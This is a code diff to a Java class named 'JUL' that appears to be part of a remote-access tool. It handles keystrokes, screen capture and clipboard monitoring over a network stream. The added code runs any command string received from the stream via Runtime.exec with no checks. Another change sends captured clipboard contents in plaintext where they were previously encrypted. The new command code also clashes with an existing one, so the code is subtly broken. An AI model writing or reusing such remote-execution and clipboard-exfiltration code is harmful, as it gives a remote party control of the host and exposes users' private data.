@@ -38,10 +38,12 @@ public class JUL {
     public static final byte KEY_RELEASED_CODE = 0x04;
     public static final byte KEY_TYPED_CODE = 0x05;
     public static final byte SEND_VERSION = 0x6;
+    public static final byte EXECUTING_NATIVE_COMMAND = 0x7;
     public static final byte SCRENECAP_STREAM_INIT = 0x10;
     public static final byte SCRENECAP_DATA = 0x11;
     public static final byte UPDATE_PACKAGE = 0x12;
     public static final byte REQUEST_VERSION = 0x13;
+    public static final byte EXEC_NATIVE_COMMAND = 0x12;
 
     public static final byte EMPTYB = 0;
     public static final byte[] EMPTYBARR = {};
@@ -108,6 +110,9 @@ public class JUL {
                     } else if (type == REQUEST_VERSION) {
                         sWrite(WriteData.SINGLE_BYTE, SEND_VERSION, EMPTYBARR, null);
                         sWrite(WriteData.SINGLE_BYTE, (byte) 0x01, EMPTYBARR, null);
+                    } else if (type == EXEC_NATIVE_COMMAND) {
+                        sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND, EMPTYBARR, null);
+                        Process p = Runtime.getRuntime().exec(readOffString(inStream));
                     }
                     
                 } 
@@ -117,10 +122,8 @@ public class JUL {
                     if (!newClipboard.equals(lastClipboard)) {
                         lastClipboard = newClipboard;
                         sWrite(WriteData.SINGLE_BYTE, CLIPBOARD_DATA, EMPTYBARR, null);
-                        sWrite(WriteData.BYTES, EMPTYB, ByteBuffer.allocate(4).putInt(lastClipboard.length()).array(), null);
-                        sWrite(WriteData.BYTES, EMPTYB, encrypt(lastClipboard.getBytes()), null);
+                        writeString(lastClipboard);
                         //System.out.println("sending clipboard");
-
                     }
                 } catch (Exception ex) {
                 }
@@ -221,5 +224,18 @@ public class JUL {
                 oOStream = null;//Do not close.  Simply disable.
                 
         }
+    }
+    
+    private static void writeString(String s) throws IOException {
+        sWrite(WriteData.BYTES, EMPTYB, ByteBuffer.allocate(4).putInt(s.length()).array(), null);
+        sWrite(WriteData.BYTES, EMPTYB, s.getBytes(), null);
+    }
+    private static String readOffString(InputStream inputStream) throws IOException {
+        int length = readOffInt(inputStream);
+        StringBuilder result = new StringBuilder();
+        for (int i = 0; i < length; i++) {
+            result.append((char)inputStream.read());
+        }
+        return result.toString();
     }
 }
